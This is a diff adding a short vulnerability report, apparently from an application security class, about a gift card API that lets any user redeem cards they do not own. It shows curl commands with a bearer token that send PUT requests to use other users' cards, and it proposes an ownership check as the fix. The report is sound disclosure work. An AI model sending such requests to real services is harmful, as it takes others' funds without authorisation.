@@ -1,0 +1,11 @@
+The vulnerability allows every user to use any giftcard using a PUT request.
+
+Running: curl -H "Authorization: Token 22cb987851bc5659229114c62e60c79abd0d2c08" https://appsecclass.report/api/cards.
+I can see that only cards 636 and 637 are unused cards that belong to me.
+
+However, I am able to run the below to use cards that don't belong to me.
+curl -H "Authorization: Token 22cb987851bc5659229114c62e60c79abd0d2c08" --request PUT https://appsecclass.report/api/use/635
+curl -H "Authorization: Token 22cb987851bc5659229114c62e60c79abd0d2c08" --request PUT https://appsecclass.report/api/use/6
+
+This can be fixed by associating cards with accounts and enforcing a policy so that only those who own the cards are able to use them for transactions.
+It could be as simple as adding a user field so that when someone tries to use the card, the system checks if they own it or not.
